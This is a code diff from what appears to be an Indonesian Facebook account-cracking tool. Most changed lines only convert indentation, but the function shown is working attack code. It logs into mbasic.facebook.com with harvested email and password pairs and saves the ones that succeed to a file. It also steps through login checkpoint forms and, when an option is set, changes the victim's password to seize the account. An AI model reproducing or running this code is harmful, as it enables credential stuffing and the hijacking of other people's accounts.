@@ -1241,52 +1241,51 @@ data = {}
 data2 = {}
 
 def mengecek(user,pw):
-    color_ok = []
-    global loop,ubah_pass,pwbaru
-    session=requests.Session()
-    ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
-    url = "https://mbasic.facebook.com"
-    session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
-    link=soup.find("form",{"method":"post"})
-    for x in soup("input"):
-        data.update({x.get("name"):x.get("value")})
-    data.update({"email":user,"pass":pw})
-    urlPost=session.post(url+link.get("action"),data=data)
-    response=bs4.BeautifulSoup(urlPost.text, "html.parser")
-    if "c_user" in session.cookies.get_dict():
-        if "Akun Anda Dikunci" in urlPost.text:
-            print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
-        else:
-            print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
-            open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
-    elif "checkpoint" in session.cookies.get_dict():
-        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-        title=re.findall("\<title>(.*?)<\/title>",str(response))
-        link2=response.find("form",{"method":"post"})
-        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
-        for x in response("input"):
-            if x.get("name") in listInput:
-                data2.update({x.get("name"):x.get("value")})
-        an=session.post(url+link2.get("action"),data=data2)
-        response2=bs4.BeautifulSoup(an.text,"html.parser")
-        cek=[cek.text for cek in response2.find_all("option")]
-        number=0
-        print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
-        if(len(cek)==0):
-            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
-                if "ubah_sandi" in ubah_pass:
-                    dat,dat2={},{}
-                    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
-                    for x in response("input"):
-                        if x.get("name") in but:
-                            dat.update({x.get("name"):x.get("value")})
-                    ubahPw=session.post(url+link2.get("action"),data=dat).text
-                    resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
-                    link3=resUbah.find("form",{"method":"post"})
-                    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
-                    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
-			    for b in resUbah("input"):
+	global loop,ubah_pass,pwbaru
+	session=requests.Session()
+	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
+	url = "https://mbasic.facebook.com"
+	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+	link=soup.find("form",{"method":"post"})
+	for x in soup("input"):
+		data.update({x.get("name"):x.get("value")})
+	data.update({"email":user,"pass":pw})
+	urlPost=session.post(url+link.get("action"),data=data)
+	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
+	if "c_user" in session.cookies.get_dict():
+		if "Akun Anda Dikunci" in urlPost.text:
+			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
+		else:
+			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
+			open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
+	elif "checkpoint" in session.cookies.get_dict():
+		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+		title=re.findall("\<title>(.*?)<\/title>",str(response))
+		link2=response.find("form",{"method":"post"})
+		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+		for x in response("input"):
+			if x.get("name") in listInput:
+				data2.update({x.get("name"):x.get("value")})
+		an=session.post(url+link2.get("action"),data=data2)
+		response2=bs4.BeautifulSoup(an.text,"html.parser")
+		cek=[cek.text for cek in response2.find_all("option")]
+		number=0
+		print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
+		if(len(cek)==0):
+			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
+				if "ubah_sandi" in ubah_pass:
+					dat,dat2={},{}
+					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+					for x in response("input"):
+						if x.get("name") in but:
+							dat.update({x.get("name"):x.get("value")})
+					ubahPw=session.post(url+link2.get("action"),data=dat).text
+					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
+					link3=resUbah.find("form",{"method":"post"})
+					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
+					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
+						for b in resUbah("input"):
 							dat2.update({b.get("name"):b.get("value")})
 						dat2.update({"password_new":"".join(pwbaru)})
 						an=session.post(url+link3.get("action"),data=dat2)
@@ -1317,7 +1316,6 @@ def mengecek(user,pw):
 		tree = Tree(" ",guide_style=f"bold white")
 		tree.add(Panel(f"login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"bold white"))
 		prints(tree)
-		  
 def scarpping_ua():
     
     
